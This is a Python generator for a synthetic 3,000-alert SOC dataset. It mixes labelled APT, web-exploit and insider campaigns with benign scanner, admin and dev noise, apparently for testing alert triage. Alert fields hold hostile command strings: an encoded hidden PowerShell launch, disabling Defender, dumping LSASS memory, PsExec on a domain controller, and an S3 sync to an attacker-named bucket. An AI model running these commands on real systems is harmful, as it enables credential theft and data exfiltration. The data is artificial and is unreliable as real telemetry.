"""
Synthetic Enterprise Alert Generator (3,000 Alerts)
Simulates a 24-hour SOC shift telemetry stream with real-world noise,
authorized administrative scripts, false-positive scanners, and covert multi-stage APT attacks.
"""

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import List, Dict, Any


def generate_enterprise_dataset(output_path: str = "data/alerts_3000.json", target_count: int = 3000) -> List[Dict[str, Any]]:
    # Fixed seed for reproducibility while generating realistic variety
    random.seed(42)
    alerts = []
    base_time = datetime(2026, 9, 28, 8, 0, 0, tzinfo=timezone.utc)
    alert_counter = 1

    # CMDB Asset Catalog definition
    assets = {
        # Tier 0: Crown Jewels (Domain Controllers, PKI, Core DB, Executive)
        "DC-CORP-01": {"tier": "Tier 0 (Crown Jewel)", "crit": 10.0, "bu": "Identity & Security", "ip": "10.0.0.5"},
        "DC-CORP-02": {"tier": "Tier 0 (Crown Jewel)", "crit": 9.8, "bu": "Identity & Security", "ip": "10.0.0.6"},
        "VAULT-PROD-01": {"tier": "Tier 0 (Crown Jewel)", "crit": 9.9, "bu": "Security Operations", "ip": "10.0.0.20"},
        "EXEC-CEO-LT": {"tier": "Tier 0 (Crown Jewel)", "crit": 9.2, "bu": "Executive Office", "ip": "10.10.1.15"},

        # Tier 1: Mission Critical (Core Web APIs, Production Database, ERP)
        "SRV-WEB-PROD-01": {"tier": "Tier 1 (Mission Critical)", "crit": 8.8, "bu": "E-Commerce & Billing", "ip": "10.0.10.50"},
        "SRV-PAYMENT-GW": {"tier": "Tier 1 (Mission Critical)", "crit": 8.9, "bu": "Finance Core", "ip": "10.0.10.55"},
        "SRV-ERP-MAIN": {"tier": "Tier 1 (Mission Critical)", "crit": 8.2, "bu": "Enterprise Operations", "ip": "10.0.10.70"},
        "SRV-FILES-CORP": {"tier": "Tier 1 (Mission Critical)", "crit": 7.8, "bu": "Corporate Storage", "ip": "10.0.20.10"},

        # Tier 2: Internal Business Workstations & Member Servers
        "WS-FIN-881": {"tier": "Tier 2 (Internal Business)", "crit": 5.5, "bu": "Finance", "ip": "10.10.15.88"},
        "WS-HR-104": {"tier": "Tier 2 (Internal Business)", "crit": 4.8, "bu": "Human Resources", "ip": "10.10.20.104"},
        "WS-ENG-312": {"tier": "Tier 2 (Internal Business)", "crit": 5.0, "bu": "Engineering", "ip": "10.10.30.212"},
        "WS-MKTG-055": {"tier": "Tier 2 (Internal Business)", "crit": 4.2, "bu": "Marketing", "ip": "10.10.40.55"},

        # Tier 3: Dev, Lab, Guest & Sandbox environments
        "DEV-KUBE-NODE-03": {"tier": "Tier 3 (Dev / Guest / Lab)", "crit": 2.5, "bu": "R&D Lab", "ip": "172.16.50.3"},
        "TEST-VM-QA": {"tier": "Tier 3 (Dev / Guest / Lab)", "crit": 2.0, "bu": "QA Testing", "ip": "172.16.60.12"},
        "GUEST-WIFI-GW": {"tier": "Tier 3 (Dev / Guest / Lab)", "crit": 1.5, "bu": "Guest Services", "ip": "192.168.100.1"},
        "DMZ-EDGE-FW": {"tier": "Tier 3 (Dev / Guest / Lab)", "crit": 3.0, "bu": "Network Perimeter", "ip": "203.0.113.1"}
    }

    # =========================================================================
    # 1. ATTACK CAMPAIGN 1: APT Ransomware & Domain Compromise (Crown Jewel Target)
    # Total alerts: ~48
    # Progression: Phishing -> PowerShell -> Defense Evasion -> Credential Dump -> Lateral Move -> DC Takeover -> C2 Beacon
    # =========================================================================
    camp1_start = base_time + timedelta(hours=2, minutes=15)
    camp1_user = "sarah.jenkins"
    camp1_src_ws = "WS-FIN-881"
    camp1_c2_ip = "198.51.100.44"

    # Stage 1: Phishing execution
    for i in range(4):
        t = camp1_start + timedelta(minutes=i*2)
        alerts.append({
            "alert_id": f"ALT-2026-{alert_counter:06d}",
            "timestamp": t.isoformat(),
            "rule_name": "Suspicious Office Document Spawning PowerShell",
            "severity": "High",
            "source_ip": "10.10.15.88",
            "destination_ip": "104.244.42.1",
            "hostname": camp1_src_ws,
            "username": camp1_user,
            "process_name": "excel.exe",
            "command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAg...",
            "parent_process": "excel.exe",
            "mitre_tactic": "Initial Access",
            "mitre_technique_id": "T1566.001",
            "mitre_technique_name": "Spearphishing Attachment",
            "asset_tier": assets[camp1_src_ws]["tier"],
            "asset_criticality_score": assets[camp1_src_ws]["crit"],
            "business_unit": assets[camp1_src_ws]["bu"],
            "ground_truth_label": "CAMPAIGN_APT_DOMAIN_COMPROMISE"
        })
        alert_counter += 1

    # Stage 2: Defense Evasion & Persistence
    for i in range(5):
        t = camp1_start + timedelta(minutes=10 + i*3)
        alerts.append({
            "alert_id": f"ALT-2026-{alert_counter:06d}",
            "timestamp": t.isoformat(),
            "rule_name": "Windows Defender Real-Time Protection Disabled via Registry",
            "severity": "Critical",
            "source_ip": "10.10.15.88",
            "destination_ip": None,
            "hostname": camp1_src_ws,
            "username": camp1_user,
            "process_name": "powershell.exe",
            "command_line": "Set-MpPreference -DisableRealtimeMonitoring $true",
            "parent_process": "powershell.exe",
            "mitre_tactic": "Defense Evasion",
            "mitre_technique_id": "T1562.001",
            "mitre_technique_name": "Impair Defenses: Disable Tools",
            "asset_tier": assets[camp1_src_ws]["tier"],
            "asset_criticality_score": assets[camp1_src_ws]["crit"],
            "business_unit": assets[camp1_src_ws]["bu"],
            "ground_truth_label": "CAMPAIGN_APT_DOMAIN_COMPROMISE"
        })
        alert_counter += 1

    # Stage 3: Credential Dumping
    for i in range(8):
        t = camp1_start + timedelta(minutes=25 + i*2)
        alerts.append({
            "alert_id": f"ALT-2026-{alert_counter:06d}",
            "timestamp": t.isoformat(),
            "rule_name": "LSASS Memory Read Access by Unsigned Process",
            "severity": "Critical",
            "source_ip": "10.10.15.88",
            "destination_ip": None,
            "hostname": camp1_src_ws,
            "username": "NT AUTHORITY\\SYSTEM",
            "process_name": "rundll32.exe",
            "command_line": "rundll32.exe C:\\ProgramData\\procdump.dll,MiniDumpWriteDump lsass.exe",
            "parent_process": "cmd.exe",
            "mitre_tactic": "Credential Access",
            "mitre_technique_id": "T1003.001",
            "mitre_technique_name": "OS Credential Dumping: LSASS Memory",
            "asset_tier": assets[camp1_src_ws]["tier"],
            "asset_criticality_score": assets[camp1_src_ws]["crit"],
            "business_unit": assets[camp1_src_ws]["bu"],
            "ground_truth_label": "CAMPAIGN_APT_DOMAIN_COMPROMISE"
        })
        alert_counter += 1

    # Stage 4: Lateral Movement to DC-CORP-01 (Tier 0)
    for i in range(12):
        t = camp1_start + timedelta(minutes=50 + i*4)
        alerts.append({
            "alert_id": f"ALT-2026-{alert_counter:06d}",
            "timestamp": t.isoformat(),
            "rule_name": "Suspicious PsExec Service Installation on Domain Controller",
            "severity": "Critical",
            "source_ip": "10.10.15.88",
            "destination_ip": assets["DC-CORP-01"]["ip"],
            "hostname": "DC-CORP-01",
            "username": "CORP\\domain_admin_svc",
            "process_name": "services.exe",
            "command_line": "PSEXESVC.exe -accepteula -s cmd.exe",
            "parent_process": "services.exe",
            "mitre_tactic": "Lateral Movement",
            "mitre_technique_id": "T1021.002",
            "mitre_technique_name": "Remote Services: SMB/Windows Admin Shares",
            "asset_tier": assets["DC-CORP-01"]["tier"],
            "asset_criticality_score": assets["DC-CORP-01"]["crit"],
            "business_unit": assets["DC-CORP-01"]["bu"],
            "ground_truth_label": "CAMPAIGN_APT_DOMAIN_COMPROMISE"
        })
        alert_counter += 1

    # Stage 5: Domain NTDS.dit Exfiltration Staging & Command and Control
    for i in range(15):
        t = camp1_start + timedelta(minutes=105 + i*3)
        alerts.append({
            "alert_id": f"ALT-2026-{alert_counter:06d}",
            "timestamp": t.isoformat(),
            "rule_name": "High Volume Outbound Encrypted C2 Beaconing to Malicious IP",
            "severity": "Critical",
            "source_ip": assets["DC-CORP-01"]["ip"],
            "destination_ip": camp1_c2_ip,
            "hostname": "DC-CORP-01",
            "username": "CORP\\domain_admin_svc",
            "process_name": "svchost.exe",
            "command_line": "svchost.exe -k netsvcs -p",
            "parent_process": "services.exe",
            "mitre_tactic": "Command and Control",
            "mitre_technique_id": "T1071.001",
            "mitre_technique_name": "Application Layer Protocol: Web Protocols",
            "asset_tier": assets["DC-CORP-01"]["tier"],
            "asset_criticality_score": assets["DC-CORP-01"]["crit"],
            "business_unit": assets["DC-CORP-01"]["bu"],
            "ground_truth_label": "CAMPAIGN_APT_DOMAIN_COMPROMISE"
        })
        alert_counter += 1

    # =========================================================================
    # 2. ATTACK CAMPAIGN 2: Web Application Exploit & API Pivot (Tier-1 Target)
    # Total alerts: ~28
    # Progression: Web Exploit -> Reverse Shell -> Cloud Token Access -> Exfil
    # =========================================================================
    camp2_start = base_time + timedelta(hours=6, minutes=40)
    camp2_host = "SRV-WEB-PROD-01"
    camp2_attacker_ip = "203.0.113.89"

    for i in range(10):
        t = camp2_start + timedelta(minutes=i*2)
        alerts.append({
            "alert_id": f"ALT-2026-{alert_counter:06d}",
            "timestamp": t.isoformat(),
            "rule_name": "Apache Log4j JNDI Lookup Ingestion Detected in HTTP Headers",
            "severity": "High",
            "source_ip": camp2_attacker_ip,
            "destination_ip": assets[camp2_host]["ip"],
            "hostname": camp2_host,
            "username": "www-data",
            "process_name": "java",
            "command_line": "java -jar /opt/tomcat/app.war",
            "parent_process": "systemd",
            "mitre_tactic": "Initial Access",
            "mitre_technique_id": "T1190",
            "mitre_technique_name": "Exploit Public-Facing Application",
            "asset_tier": assets[camp2_host]["tier"],
            "asset_criticality_score": assets[camp2_host]["crit"],
            "business_unit": assets[camp2_host]["bu"],
            "ground_truth_label": "CAMPAIGN_WEB_API_EXPLOIT"
        })
        alert_counter += 1

    for i in range(18):
        t = camp2_start + timedelta(minutes=22 + i*3)
        alerts.append({
            "alert_id": f"ALT-2026-{alert_counter:06d}",
            "timestamp": t.isoformat(),
            "rule_name": "Cloud API Key Harvested from Environment Variable & Egress S3",
            "severity": "High",
            "source_ip": assets[camp2_host]["ip"],
            "destination_ip": "52.216.184.65",
            "hostname": camp2_host,
            "username": "www-data",
            "process_name": "bash",
            "command_line": "aws s3 sync /var/data/ s3://exfil-bucket-attacker-shadow/",
            "parent_process": "java",
            "mitre_tactic": "Exfiltration",
            "mitre_technique_id": "T1048.003",
            "mitre_technique_name": "Exfiltration Over Alternative Protocol: Cloud Storage",
            "asset_tier": assets[camp2_host]["tier"],
            "asset_criticality_score": assets[camp2_host]["crit"],
            "business_unit": assets[camp2_host]["bu"],
            "ground_truth_label": "CAMPAIGN_WEB_API_EXPLOIT"
        })
        alert_counter += 1

    # =========================================================================
    # 3. ATTACK CAMPAIGN 3: Insider Data Exfiltration (HR / File Server)
    # Total alerts: ~16
    # =========================================================================
    camp3_start = base_time + timedelta(hours=14, minutes=10)
    for i in range(16):
        t = camp3_start + timedelta(minutes=i*4)
        alerts.append({
            "alert_id": f"ALT-2026-{alert_counter:06d}",
            "timestamp": t.isoformat(),
            "rule_name": "Massive File Download Followed by USB Storage Transfer",
            "severity": "Medium",
            "source_ip": "10.10.20.104",
            "destination_ip": assets["SRV-FILES-CORP"]["ip"],
            "hostname": "WS-HR-104",
            "username": "marcus.vance",
            "process_name": "explorer.exe",
            "command_line": "robocopy \\\\SRV-FILES-CORP\\SalaryRecords E:\\Backup",
            "parent_process": "explorer.exe",
            "mitre_tactic": "Exfiltration",
            "mitre_technique_id": "T1052.001",
            "mitre_technique_name": "Exfiltration Over Physical Medium: USB",
            "asset_tier": assets["WS-HR-104"]["tier"],
            "asset_criticality_score": assets["WS-HR-104"]["crit"],
            "business_unit": assets["WS-HR-104"]["bu"],
            "ground_truth_label": "CAMPAIGN_INSIDER_EXFIL"
        })
        alert_counter += 1

    # =========================================================================
    # 4. BENIGN NOISE & FALSE POSITIVES (The massive 2,900+ alert noise flood)
    # =========================================================================

    # Noise Category A: External Port & Vulnerability Scanner (Qualys / Shodan / Nessus)
    # ~1,100 alerts on low-criticality perimeter/DMZ
    scan_start = base_time + timedelta(hours=1)
    for i in range(1150):
        t = scan_start + timedelta(seconds=i*45 + random.randint(0, 30))
        target_port = random.choice([80, 443, 8080, 8443, 22, 3389, 445, 8000, 9000])
        alerts.append({
            "alert_id": f"ALT-2026-{alert_counter:06d}",
            "timestamp": t.isoformat(),
            "rule_name": f"Inbound TCP Port Scan Detected (Port {target_port})",
            "severity": "Low",
            "source_ip": f"198.51.100.{random.randint(100, 200)}",
            "destination_ip": "203.0.113.1",
            "hostname": "DMZ-EDGE-FW",
            "username": None,
            "process_name": None,
            "command_line": None,
            "parent_process": None,
            "mitre_tactic": "Reconnaissance",
            "mitre_technique_id": "T1046",
            "mitre_technique_name": "Network Service Discovery",
            "asset_tier": assets["DMZ-EDGE-FW"]["tier"],
            "asset_criticality_score": assets["DMZ-EDGE-FW"]["crit"],
            "business_unit": assets["DMZ-EDGE-FW"]["bu"],
            "ground_truth_label": "BENIGN_EXTERNAL_SCANNER"
        })
        alert_counter += 1

    # Noise Category B: External Password Spraying on VPN (Failed Attempts)
    # ~700 alerts, random user accounts, all failed
    spray_start = base_time + timedelta(hours=3, minutes=30)
    usernames_pool = [f"user_{idx}@corp.local" for idx in range(150)]
    for i in range(720):
        t = spray_start + timedelta(seconds=i*60 + random.randint(0, 40))
        u = random.choice(usernames_pool)
        alerts.append({
            "alert_id": f"ALT-2026-{alert_counter:06d}",
            "timestamp": t.isoformat(),
            "rule_name": "VPN Authentication Failure: Invalid Password",
            "severity": "Low",
            "source_ip": "192.0.2.77",
            "destination_ip": "203.0.113.1",
            "hostname": "DMZ-EDGE-FW",
            "username": u,
            "process_name": "openvpn.exe",
            "command_line": None,
            "parent_process": None,
            "mitre_tactic": "Credential Access",
            "mitre_technique_id": "T1110.003",
            "mitre_technique_name": "Brute Force: Password Spraying",
            "asset_tier": assets["DMZ-EDGE-FW"]["tier"],
            "asset_criticality_score": assets["DMZ-EDGE-FW"]["crit"],
            "business_unit": assets["DMZ-EDGE-FW"]["bu"],
            "ground_truth_label": "BENIGN_PASSWORD_SPRAY_FAILED"
        })
        alert_counter += 1

    # Noise Category C: Authorized SCCM / IT Admin Patch Management Scripts
    # ~480 alerts across workstations
    admin_start = base_time + timedelta(hours=10)
    ws_targets = ["WS-ENG-312", "WS-MKTG-055", "WS-FIN-881", "WS-HR-104"]
    for i in range(490):
        t = admin_start + timedelta(seconds=i*90 + random.randint(0, 30))
        tgt_ws = random.choice(ws_targets)
        alerts.append({
            "alert_id": f"ALT-2026-{alert_counter:06d}",
            "timestamp": t.isoformat(),
            "rule_name": "Automated Software Inventory PowerShell Script Executed",
            "severity": "Informational",
            "source_ip": "10.0.0.15",
            "destination_ip": assets[tgt_ws]["ip"],
            "hostname": tgt_ws,
            "username": "CORP\\svc_sccm_deploy",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\Inventory.ps1",
            "parent_process": "CcmExec.exe",
            "mitre_tactic": "Execution",
            "mitre_technique_id": "T1059.001",
            "mitre_technique_name": "Command and Scripting Interpreter: PowerShell",
            "asset_tier": assets[tgt_ws]["tier"],
            "asset_criticality_score": assets[tgt_ws]["crit"],
            "business_unit": assets[tgt_ws]["bu"],
            "ground_truth_label": "BENIGN_ADMIN_SCCM_PATCH"
        })
        alert_counter += 1

    # Noise Category D: Developer CI/CD Lab & Docker Testing
    # ~360 alerts on Tier-3 node
    dev_start = base_time + timedelta(hours=8)
    for i in range(370):
        t = dev_start + timedelta(seconds=i*120 + random.randint(0, 60))
        alerts.append({
            "alert_id": f"ALT-2026-{alert_counter:06d}",
            "timestamp": t.isoformat(),
            "rule_name": "Container Privilege Escalation Check & Build Execution",
            "severity": "Low",
            "source_ip": "172.16.50.3",
            "destination_ip": "172.16.50.1",
            "hostname": "DEV-KUBE-NODE-03",
            "username": "developer_test",
            "process_name": "dockerd",
            "command_line": "docker run --privileged --rm alpine:latest sh -c 'apk update'",
            "parent_process": "systemd",
            "mitre_tactic": "Privilege Escalation",
            "mitre_technique_id": "T1068",
            "mitre_technique_name": "Exploitation for Privilege Escalation",
            "asset_tier": assets["DEV-KUBE-NODE-03"]["tier"],
            "asset_criticality_score": assets["DEV-KUBE-NODE-03"]["crit"],
            "business_unit": assets["DEV-KUBE-NODE-03"]["bu"],
            "ground_truth_label": "BENIGN_DEV_CI_CD"
        })
        alert_counter += 1

    # Noise Category E: Antivirus False Positives / Adware Tracking Cookies
    # Fill remaining alerts up to target_count
    remaining = target_count - len(alerts)
    if remaining > 0:
        av_start = base_time + timedelta(hours=4)
        for i in range(remaining):
            t = av_start + timedelta(seconds=i*180 + random.randint(0, 100))
            tgt_ws = random.choice(ws_targets)
            alerts.append({
                "alert_id": f"ALT-2026-{alert_counter:06d}",
                "timestamp": t.isoformat(),
                "rule_name": "Heuristic Detection: Potentially Unwanted Program (PUA/Adware)",
                "severity": "Low",
                "source_ip": None,
                "destination_ip": None,
                "hostname": tgt_ws,
                "username": random.choice(["jessica.alba", "david.kim", "robert.lang", "lisa.chen"]),
                "process_name": "chrome.exe",
                "command_line": "chrome.exe --profile-directory=Default",
                "parent_process": "explorer.exe",
                "mitre_tactic": "Defense Evasion",
                "mitre_technique_id": "T1564.004",
                "mitre_technique_name": "Hide Artifacts: NTFS File Attributes",
                "asset_tier": assets[tgt_ws]["tier"],
                "asset_criticality_score": assets[tgt_ws]["crit"],
                "business_unit": assets[tgt_ws]["bu"],
                "ground_truth_label": "BENIGN_AV_FALSE_POSITIVE"
            })
            alert_counter += 1

    # Sort alerts chronologically
    alerts.sort(key=lambda x: x["timestamp"])

    # Save to JSON
    out_file = Path(output_path)
    out_file.parent.mkdir(parents=True, exist_ok=True)
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(alerts, f, indent=2)

    print(f"Generated {len(alerts)} alerts -> {output_path}")
    return alerts


if __name__ == "__main__":
    generate_enterprise_dataset()
